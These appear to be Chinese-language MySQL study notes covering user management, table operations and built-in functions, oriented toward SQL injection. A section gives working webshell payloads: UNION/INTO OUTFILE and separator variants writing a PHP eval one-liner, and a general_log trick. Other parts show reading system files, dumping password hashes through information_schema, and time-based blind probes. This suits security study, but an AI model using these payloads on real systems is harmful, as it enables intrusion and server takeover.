[toc]



##### 用户相关操作

###### 连接数据库

```
mysql -h <ip> -P <port> -u <user> -p <password>;

mysql -u root -p;  #常用
```

###### 创建用户

```
create user 'test'@'localhost' identified by '123456';  #创建用户test密码123456

insert into mysql.user(Host,User,Password) values("localhost","test",password("123456")); #直接在mysql.user表里添加用户

select host, user, password from mysql.user; #列出所有用户和密码
```

<!--此处的"localhost"，是指该用户只能在本地登录，不能在另外一台机器上远程登录。如果想远程登录的话，将"localhost"改为"%"，表示在任何一台电脑上都可以登录。也可以指定某台机器可以远程登录-->

mysql5.7 开始新版后的mysql数据库下的user表中已经没有password字段了，保存密码的字段变成了authentication_string字段

###### 删除用户

```
Delete FROM mysql.user Where User='test' and Host='localhost'; #前提是有mysql数据库权限

drop user 'test'@'%';                                          #删除 test@% 用户
```

###### 修改密码

```
update mysql.user set password=password('新密码') where User="test" and Host="localhost"; #mysql5.7以下版本

update mysql.user set authentication_string=password('12345678') where User="test" and Host="localhost";#mysql5.7以上版本

flush privileges;  #刷新系统权限表
```

###### 用户授权

grant 权限 on 数据库.* to 用户名@登录主机 identified by "密码";

```
grant ALL on *.* to 'test'@'%';  #ALL表示授予test所有权限、*.*表示所有数据库中的所有表
grant select,update,insert on testdb.* to 'test'@'%'; #表示test用户拥有testdb数据库的查询，修改，增加权限。
flush privileges;  #刷新系统权限表
```

<!--其他权限：ALTER、ALTER ROUTINE、CREATE、CREATE ROUTINE、CREATE TABLESPACE、CREATE TEMPORARY TABLES、CREATE USER、CREATE VIEW、DELETE、DROP、EVENT、EXECUTE、FILE、GRANT OPTION、INDEX、INSERT、LOCK TABLES、PROCESS、PROXY、REFERENCES、RELOAD、REPLICATION CLIENT、REPLICATION SLAVE、SELECT、SHOW DATABASES、SHOW VIEW、SHUTDOWN、SUPER、TRIGGER、UPDATE、USAGE。-->

 设置允许远程登录

```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;
```

##### 数据库创建修改

```
create database abc;                  #创建数据库abc

drop database abc;                    #删除数据库abc

show databases;                       #显示所有数据库

use abc;                              #选择要操作的数据库
```

```
create table username(
id int not null auto_increment,
name varchar(20) not null,
city varchar(200), 
address varchar(100), 
primary key(id)
)engine=InnoDB default charset=utf8;                                  #创建表username,要让 AUTO_INCREMENT 序列以其他的值起始，请使用下面的 SQL 语法ALTER TABLE 表名 AUTO_INCREMENT=100

drop table username;                                                  #删除表,是直接将表格删除，无法找回
truncate username;                                                    #删除表中所有数据，但不能与where一起使用；
delete from username;                                                 #删除表中所有数据，可与where一起使用删除指定行行

insert into username (name,city,address) values ('test',"cd","1322"); #添加一行
delete from username where city="cd";                                 #删除行。注意如果不加where会删除所有行
update username set name="test123" where name='test';                 #修改数据，如果不加where会修改所有列

alter table 表名 <rename,change,add,modify> 列名 数据类型 after/first 列后

alter table username rename test;                                     #修改表名为test
alter table test change address date varchar(100);                    #修改address列名称为date
alter table test add tel varchar(50) first;                           #添加列,排在第一列，不加first默认最后
alter table test modify tel int(15);                                  #修改tel数据类型
alter table test modify tel int(15) after city;                       #修改tel列到city列后面
```

##### 文件操作

###### 读取文件

读取文件满足三个条件

1.拥有file权限
2.max-allowed-packet最大允许传输包的大小，就是查询得出的结果，发送到客户端的每个网络包的最大大小。
3.secure_file_priv对数据导入导出进行限制，

4.支持 ‘ 号

- 如果secure_file_priv 为空时，那么对导入和到处就没有限制
- 当这个为一个指定的目录时，那么就只能向这个指定目录导入或者导出
- 当这个值被设置成NULL时，那么就禁止导入导出

查看权限 show grants for root;

```
mysql> show grants for root;
+-------------------------------------------------------------+
| Grants for root@%                                           |
+-------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION |
+-------------------------------------------------------------+
1 row in set (0.00 sec)
```

查看用户是否具有file权限

> select file_priv from mysql.user where user='root';

```
mysql> select user,file_priv from mysql.user where user='root';
+------+-----------+
| user | file_priv |
+------+-----------+
| root | Y         |
| root | Y         |
+------+-----------+
2 rows in set (0.01 sec)
```

查看max_allowed_packet

> select @@max_allowed_packet;
> show global variables like 'max_allowed_packet';

```
mysql> show global variables like 'max_allowed_packet';
+--------------------+---------+
| Variable_name      | Value   |
+--------------------+---------+
| max_allowed_packet | 4194304 |
+--------------------+---------+
1 row in set (0.00 sec)
```

查看secure_file_priv配置

>select @@secure_file_priv;
>
>show global variables like 'secure_file_priv';

```
mysql> select @@secure_file_priv;
+-----------------------+
| @@secure_file_priv    |
+-----------------------+
| /var/lib/mysql-files/ |
+-----------------------+
1 row in set (0.00 sec)

mysql> show global variables like 'secure_file_priv';
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.00 sec)
```

看来只支持 /var/lib/mysql-files/目录的读写，修改方法：
windows下修改mysql.ini文件，在[mysqld]下添加条目：secure_file_priv=''

linux下在/etc/my.conf或者/etc/my.cnf的[mysqld]下面添加secure_file_priv=

我的是linux.修改完后systemctl restart
mysqld重启一下mysql



###### 文件读写方式：

select into outfile 将内容写入到系统文件中
load_file() ：读取文件
load data infile() ：读取文件
system cat ：读取文件

select into outfile 将内容写入到系统文件中，写入的目录中要有写入权限：rwxrwxrwx

```
mysql> select "<?PHP phpinfo(); ?>" into outfile "/tmp/a.php";
Query OK, 1 row affected (0.02 sec)
```

 用load_file()查看

```
mysql> select load_file('/tmp/a.php');
+-------------------------+
| load_file('/tmp/a.php') |
+-------------------------+
| <?PHP phpinfo(); ?>
|                         |
+-------------------------+
1 row in set (0.00 sec)
```

或者用system cat 在mysql5.x版本以上，可使用。 只能本地读取，不能远程连接mysql使用。 无法越权读取。

```
mysql> system cat /tmp/a.php;
<?PHP phpinfo(); ?>
```

例： 

create table test(txt text);                                            #创建表test
insert into test(txt) values (load_file('/etc/group')); #把系统group的内容写入test表里
或者用
load data infile '/etc/group' into table test;

```
mysql> create table test(txt text);
Query OK, 0 rows affected (0.01 sec)

mysql> load data infile '/etc/group' into table test;
Query OK, 79 rows affected (0.01 sec)
Records: 79  Deleted: 0  Skipped: 0  Warnings: 0

mysql> select * from test;
+----------------------------+
| txt                        |
+----------------------------+
| root:x:0:                  |
| bin:x:1:                   |
| daemon:x:2:                |
| sys:x:3:                   |
| adm:x:4:                   |
| tty:x:5:                   |
......
中间省略
......
| mysql:x:27:                |
+----------------------------+
79 rows in set (0.00 sec)

```

###### 写入WebShell的几种方式

**1、利用Union select 写入**

这是最常见的写入方式，`union` 跟`select into outfile`，将一句话写入`evil.php`，仅适用于联合注入。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户File权限、获取物理路径。

```
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'

?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
```

**2、利用分隔符写入**

当`Mysql`注入点为盲注或报错，`Union select`写入的方式显然是利用不了的，那么可以通过分隔符写入。`SQLMAP`的 `--os-shell`命令，所采用的就是一下这种方式。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户`File`权限、获取物理路径。

```
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
```

同样的技巧，一共有四种形式：

```
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
```

**3、利用log写入**

新版本的`MySQL`设置了导出文件的路径，很难在获取`Webshell`过程中去修改配置文件，无法通过使用`select into outfile`来写入一句话。这时，我们可以通过修改`MySQL`的`log`文件来获取`Webshell`。

具体权限要求：数据库用户需具备`Super`和`File`服务器权限、获取物理路径。

```
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式
```



###### 利用information_schema数据库爆数据

| 表名                                  | 说明                                                         |
| ------------------------------------- | ------------------------------------------------------------ |
| SCHEMATA                              | 提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表 |
| TABLES                                | 提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema、表类型、表引擎、创建时间等信息。是show tables from schemaname的结果取之此表 |
| COLUMNS                               | 提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表 |
| STATISTICS                            | 提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表 |
| USER_PRIVILEGES                       | 用户权限表:给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表 |
| SCHEMA_PRIVILEGES                     | 方案权限表:给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表 |
| TABLE_PRIVILEGES                      | 表权限表:给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表 |
| COLUMN_PRIVILEGES                     | 列权限表:给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表 |
| CHARACTER_SETS                        | 字符集表:提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表 |
| COLLATIONS                            | 提供了关于各字符集的对照信息                                 |
| COLLATION_CHARACTER_SET_APPLICABILITY | 指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。 |
| TABLE_CONSTRAINTS                     | 描述了存在约束的表。以及表的约束类型                         |
| KEY_COLUMN_USAGE                      | 描述了具有约束的键列                                         |
| ROUTINES                              | 提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列 |
| VIEWS                                 | 给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息 |
| TRIGGERS                              | 提供了关于触发程序的信息。必须有super权限才能查看该表        |

通过information_schema下的SCHEMATA爆数据库

> select schema_name from information_schema.schemata;

```
mysql> select schema_name from information_schema.schemata;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.00 sec)
```

爆当前库的表

> select group_concat(table_name) from information_schema.tables where table_schema=database()

通过information_schema下的TABLES爆数据表

> SELECT table_name from information_schema.tables WHERE table_schema='test';

```
mysql> SELECT table_name from information_schema.tables WHERE table_schema='test';
+------------+
| table_name |
+------------+
| abc        |
| test       |
| user       |
+------------+
3 rows in set (0.00 sec)
```

通过information_schema下的COLUMNS爆数据列

> SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM information_schema.`COLUMNS` WHERE TABLE_SCHEMA = 'test' AND TABLE_NAME = 'abc'

```
mysql> SELECT TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM information_schema.`COLUMNS` WHERE TABLE_SCHEMA = 'test' AND TABLE_NAME = 'abc';
+--------------+------------+-------------+
| TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME |
+--------------+------------+-------------+
| test         | abc        | id          |
| test         | abc        | name        |
| test         | abc        | city        |
| test         | abc        | address     |
+--------------+------------+-------------+
8 rows in set (0.00 sec)
```

最后再爆内容

> select * from test.abc;

通过mysql库下的USER爆用户名和HASH

> select user,password from mysql.user;

```
mysql> select user,password from mysql.user;
ERROR 1054 (42S22): Unknown column 'password' in 'field list'
```

mysql5.7 开始新版后的mysql数据库下的user表中已经没有password字段了，保存密码的字段变成了authentication_string字段

> select user,authentication_string from mysql.user;

```
mysql> select user,authentication_string  from mysql.user;
+---------------+-------------------------------------------+
| user          | authentication_string                     |
+---------------+-------------------------------------------+
| root          | *8EC13A3A19589D34DF6800D96702A99874BC5EEE |
| mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| root          | *8EC13A3A19589D34DF6800D96702A99874BC5EEE |
+---------------+-------------------------------------------+
```

##### MYSQL常用函数

###### 常用查询命令

```
show database;  									#列出所有数据库
show tables; 										#列出当数据库下的所有表
show grants;										#显示当前用户权限
show grants fro root;								#显示roo用户权限
select file_priv from mysql.user where user='root'; #查询root用户file权限
select database();									#获取当前数据库
select schema();									#获取当前数据库
select user();										#用户名
select session_user();								#获取连接数据库的用户名
select system_user();								#获取系统用户名
select current_user();								#获取当前用户名
select @@version;									#获取版本信息
select @@hostname;									#获取主机名
select @@datadir; 									#获取数据库⽂件路径
select @@basedir;    								#获取数据库安装路径
select @@version_compile_os; 						#获取当前操作系统
select @@secure_file_priv;							#查看文件导入导出目录
select @@max_allowed_packet;						#查看最大允许传输包大小
select connection_id();								#返回服务器的连接数，也就是到现在为止MySQL服务的连接次数

```

###### MySQL 字符串函数

length(s);

char_length(s);

character_length(s);

octet_length(s);

都是返回字符串 s 的字符长度，对于多字节字符，其CHAR_LENGTH()仅计算一次

```
mysql> select length('abcd1234');
+--------------------+
| length('abcd1234') |
+--------------------+
|                  8 |
+--------------------+
1 row in set (0.00 sec)

cancat(s1,s2...sn);
```

返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数

```
mysql> select concat('abc',123,'cde',456);
+-----------------------------+
| concat('abc',123,'cde',456) |
+-----------------------------+
| abc123cde456                |
+-----------------------------+
1 row in set (0.00 sec)

mysql> select concat('abc',123,'cde',null);
+------------------------------+
| concat('abc',123,'cde',null) |
+------------------------------+
| NULL                         |
+------------------------------+
1 row in set (0.00 sec)
```

concat_ws(x, s1,s2...sn);

CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT_WS()不会忽略任何空字符串。 (然而会忽略所有的 NULL）。

```
mysql> select concat_ws(0x2c,user(),database());
+-----------------------------------+
| concat_ws(0x2c,user(),database()) |
+-----------------------------------+
| root@localhost,test               |
+-----------------------------------+
1 row in set (0.00 sec)
```

GROUP_CONCAT()

group_concat([distinct] 要连接的字段 [order by ASC/DESC 排序字段] [Separator '分隔符'])

distinctDISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。Separator是一个字符串值，它被用于插入到结果值中。缺省为一个逗号 (",")，可以通过指定 SEPARATOR "" 完全地移除这个分隔符。

```
mysql> select name from abc;
+------+
| name |
+------+
| e    |
| f    |
| c    |
| e    |
| f    |
| c    |
| d    |
+------+
7 rows in set (0.00 sec)

mysql> select group_concat(name) from abc;
+--------------------+
| group_concat(name) |
+--------------------+
| e,f,c,e,f,c,d      |
+--------------------+
1 row in set (0.00 sec)

mysql> select group_concat(name separator 0x2d) from abc;
+-----------------------------------+
| group_concat(name separator 0x2d) |
+-----------------------------------+
| e-f-c-e-f-c-d                     |
+-----------------------------------+
1 row in set (0.01 sec)

field(s,s1,s2...);返回第一个字符串 s 在字符串列表(s1,s2...)中的位置
+-------------------------------------+
| FIELD("c", "a", "b", "c", "d", "e") |
+-------------------------------------+
|                                   3 |
+-------------------------------------+
1 row in set (0.00 sec)

FIND_IN_SET(s1,s2);返回在字符串s2中与s1匹配的字符串的位置
mysql> select find_in_set('c','a,b,c,d');
+----------------------------+
| find_in_set('c','a,b,c,d') |
+----------------------------+
|                          3 |
+----------------------------+
1 row in set (0.00 sec)
```

left(s,n); 返回字符串 s 的前 n 个字符

```
mysql> select left('abcde',2);
+-----------------+
| left('abcde',2) |
+-----------------+
| ab              |
+-----------------+
1 row in set (0.00 sec)
```

right(s,n); 返回字符串 s 的后 n 个字符

```
mysql> select right('abcde',2);
+------------------+
| right('abcde',2) |
+------------------+
| de               |
+------------------+
1 row in set (0.00 sec)
```

mid(s,n,len); 从字符串 s 的 n 位置截取长度为 len 的子字符串,其它格式：mid(s FROM n FOR len)

```
mysql> select mid('abcde',2,3);
+------------------+
| mid('abcde',2,1) |
+------------------+
| bcd              |
+------------------+
1 row in set (0.00 sec)
```

substr(s,n,len);substring(s,n,len);从字符串 s 的 n 位置截取长度为 len 的子字符串，还有其它格式：substring(s FROM n FOR len)

```
mysql> select substr('abcde',2,3);
+---------------------+
| substr('abcde',2,3) |
+---------------------+
| bcd                 |
+---------------------+
1 row in set (0.00 sec)

substring_index(s, delimiter, n);返回从字符串 s 的第 n 个出现的分隔符 delimiter 之后的子串。
 如果 number 是正数，返回第 number 个字符左边的字符串。
 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。 

mysql> SELECT SUBSTRING_INDEX(user(),'@',1);
+-------------------------------+
| SUBSTRING_INDEX(user(),'@',1) |
+-------------------------------+
| root                          |
+-------------------------------+
1 row in set (0.00 sec)

replace(s,s1,s2);将字符串 s2 替代字符串 s 中的字符串 s1
mysql> select replace('abccefg','c','b');
+----------------------------+
| replace('abccefg','c','b') |
+----------------------------+
| abbbefg                    |
+----------------------------+
1 row in set (0.00 sec)
```

strcmp(s1,s2);比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1>s2 返回 1，如果 s1<s2 返回 -1

```
mysql> select strcmp('r',mid(user(),1,1));#判断用户名第一个字母是否为r
+-----------------------------+
| strcmp('r',mid(user(),1,1)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.00 sec)
```

ascii(s)和ord(str);

ascii(s)返回第一个字符的ASCII码，如果s是空字符串，返回0。如果s是NULL，返回NULL

ORD(str)如果字符串str最左面字符是一个多字节字符，通过以格式((first byte ASCII code)*256+(second byte ASCII code))[*256+third byte ASCII code...]返回字符的ASCII代码值来返回多字节字符代码。如果最左面的字符不是一个多字节字符。返回与ASCII()函数返回的相同值

```
mysql> select ord(mid(user(),2,1));
+----------------------+
| ord(mid(user(),2,1)) |
+----------------------+
|                  111 |
+----------------------+
1 row in set (0.01 sec)
```

char(x);返回数字的ASCII码值

```
mysql> select char(111);
+-----------+
| char(111) |
+-----------+
| o         |
+-----------+
1 row in set (0.00 sec)
```

insert(s,x,len,s);字符串 s1替换 s的 x 位置开始长度为 len 的字符串

```
mysql> select insert('abcd1234',4,1,'@');
+----------------------------+
| insert('abcd1234',4,1,'@') |
+----------------------------+
| abc@1234                   |
+----------------------------+
1 row in set (0.00 sec)
```

LPAD(s,len,s1)返回字符串s，左面用字符串s1补直到s是len个字符长

```
mysql> select lpad('aaa',10,'?');
+--------------------+
| lpad('aaa',10,'?') |
+--------------------+
| ???????aaa         |
+--------------------+
1 row in set (0.01 sec)
```

RPAD(s,len,s1)返回字符串s，右面用字符串s1补直到s是len个字符长

```
mysql> select rpad('aaa',10,'?');
+--------------------+
| rpad('aaa',10,'?') |
+--------------------+
| aaa???????         |
+--------------------+
1 row in set (0.00 sec)
```

locate(s1,s,n); 返回子串s1在字符串s第一个出现的位置，若指定n,从位置n开始。如果s1不是在s里面，返回0

```
mysql> select LOCATE('a', '12a45a78',5);
+---------------------------+
| LOCATE('a', '12a45a78',5) |
+---------------------------+
|                         6 |
+---------------------------+
1 row in set (0.00 sec)
```

position(s1 in s)从字符串 s 中获取 s1 的开始位置,如果s1不是在s里面，返回0

```
mysql> select position('a' in '123a56');
+---------------------------+
| position('a' in '123a56') |
+---------------------------+
|                         4 |
+---------------------------+
1 row in set (0.00 sec)
```

instr(s,s1);返回子串`s1在字符串`s`中的第一个出现的位置。这与有2个参数形式的`LOCATE()`相同，除了参数被颠倒。

find_in_set(s1,s2) ;返回在字符串s2中与s1匹配的字符串的位置

```
mysql> SELECT FIND_IN_SET(mid(database(),1,1), "a,b,c,d,e,f,g,i,j,k,l,b,m,n,o,p,q,r,s,t,u,v,w,x,y,z");#判断数据库名第一个字符
+-----------------------------------------------------------------------------------------+
| FIND_IN_SET(mid(database(),1,1), "a,b,c,d,e,f,g,i,j,k,l,b,m,n,o,p,q,r,s,t,u,v,w,x,y,z") |
+-----------------------------------------------------------------------------------------+
|                                                                                      20 |
+-----------------------------------------------------------------------------------------+
1 row in set (0.07 sec)
```

reverse(s);返回字符串s相反的字符串

format(x,n); 将数字x保留到小数点后 n 位，最后一位四舍五入

repeat(s,n);将字符串 s 重复 n 次

lcase(s);lower(s);将字符串 s 的所有字母变成小写字母

ucase(s);upper(s);将字符串 s 的所有字母变成大写字母

space(n);返回 n 个空格

trim(s);去掉字符串 s 开始和结尾处的空格

ltrim(s);去掉字符串 s 开始处的空格

rtrim(s);去掉字符串 s 结尾处的空格

###### MySQL 数字函数

ABS(x);返回 x 的绝对值

MOD(N,M) 或 %: 返回N被M除的余数

POW(x,y) 或 POWER(x,y)： 返回 x 的 y 次方

SQRT(x)： 返回x的平方根

EXP(x) ;返回 e 的 x 次方

n DIV m ;整除，n 为被除数，m 为除数

GREATEST(expr1, expr2, expr3, …) ： 返回列表中的最大值

LEAST(expr1, expr2, expr3, …)： 返回列表中的最小值

MAX(expression)： 返回字段 expression 中的最大值

MIN(expression)： 返回字段 expression 中的最小值

AVG(expression) ：返回字段expression 的平均值

SUM(expression)： 返回指定字段的总和

count(expression); 返回查询的记录总数，expression 参数是一个字段或者 * 号

```
mysql> select count(name) from abc;
+-------------+
| count(name) |
+-------------+
|           7 |
+-------------+
1 row in set (0.00 sec)
```

ceil(x);返回大于或等于 x 的最小整数

ceilng(x);返回大于或等于 x 的最小整数

floor(x);返回小于或等于 x 的最大整数

rand();返回 0 到 1 的随机数

```
mysql> select floor(rand()*100);#10内的随机数
+-------------------+
| floor(rand()*10) |
+-------------------+
|                6 |
+-------------------+
1 row in set (0.00 sec)
```

round(x);返回离 x 四舍五入取整数,可以指定保留小数后几位的值

```
mysql> select round(3.51515,2);
+------------------+
| round(3.51515,2) |
+------------------+
|             3.52 |
+------------------+
1 row in set (0.00 sec)
```

truncate(x,n);返回数值 x 保留到小数点后 n 位的值（与 round 最大的区别是不会进行四舍五入）

cast(x AS type); 转换数据类型

BIN(x);返回x的二进制编码

HEX(x);返回x的十六进制编码

OCT(x);返回x的八进制编码

CONV(x,f1,f2)将x从f1进制数变成f2进制数

```
mysql> select conv('ffff',16,10);
+--------------------+
| conv('ffff',16,10) |
+--------------------+
| 65535              |
+--------------------+
1 row in set (0.00 sec)
```

###### MySQL 日期函数

CURDATE()或CURRENT_DATE()返回当前日期

CURTIME()或CURRENT_TIME()返回当前时间

CURRENT_TIMESTAMP();LOCALTIME();LOCALTIMESTAMP();NOW()都是返回当前日期和时间

DAY(d)返回日期值 d 的日期部分

DAYOFWEEK(date): 返回日期date的星期索引(1=星期天，2=星期一, …7=星期六)

DAYNAME(date): 返回date的星期名字

DAYOFMONTH(date): 返回date的月份中的日期，在1到31范围内

QUARTER(date): 返回date一年中的季度，范围1到4

DAYOFYEAR(date): 返回date在一年中的日数, 在1到366范围内

MONTHNAME(date) : 返回date的月份名字

WEEKOFYEAR(d) 或WEEK(d)计算日期 d 是本年的第几个星期，范围是 0 到 53

YEAR(d)返回年份

YEARWEEK(date, mode)返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推

###### 其它常用函数

IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。

```
mysql> select if(ascii(mid(user(),1,1))='114','yes','no');#判断用户名第一个字符是
+---------------------------------------------+
| if(ascii(mid(user(),1,1))='114','yes','no') |
+---------------------------------------------+
| yes                                         |
+---------------------------------------------+
1 row in set (0.00 sec)
```

CASE

```
CASE expression
WHEN condition1 THEN result1
WHEN condition2 THEN result2
...
WHEN conditionN THEN resultN
ELSE result 
END
```

CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了.

```
mysql> SELECT CASE 0  WHEN 1<0 THEN 'true' ELSE 'false' END;#这里先比较0=(1<0)
+-----------------------------------------------+
| CASE 0  WHEN 1<0 THEN 'true' ELSE 'false' END |
+-----------------------------------------------+
| true                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)
```

PASSWORD(str)函数可以对字符串str进行加密。一般情况下，PASSWORD(str)函数主要是用来给用户 的密码加密的。

MD5(str)函数可以对字符串str进行加密。MD5(str)函数主要对普通的数据进行加密

mysql> select md5("123456"); +----------------------------------+ | md5("123456") | +----------------------------------+ | e10adc3949ba59abbe56e057f20f883e | +----------------------------------+ 1 row in set (0.01 sec)

BENCHMARK(count,expr)函数将表达式expr重复执行count次，然后返回执行时间。该函数可以用来 判断MySQL处理表达式的速度。

```
mysql> select 1 and if((substr(user(),1,1)='r'),BENCHMARK(100000000,md5('a')),1);#判断用户第一个字符是否为r
+--------------------------------------------------------------------+
| 1 and if((substr(user(),1,1)='r'),BENCHMARK(100000000,md5('a')),1) |
+--------------------------------------------------------------------+
|                                                                  0 |
+--------------------------------------------------------------------+
1 row in set (16.16 sec)
```



sleep(t);休眠t秒

```
mysql> select 1 and if((substr(user(),1,1)='r'),sleep(10),1);#判断用户第一个字符是否为r
+------------------------------------------------+
| 1 and if((substr(user(),1,1)='r'),sleep(10),1) |
+------------------------------------------------+
|                                              0 |
+------------------------------------------------+
1 row in set (10.00 sec)
```

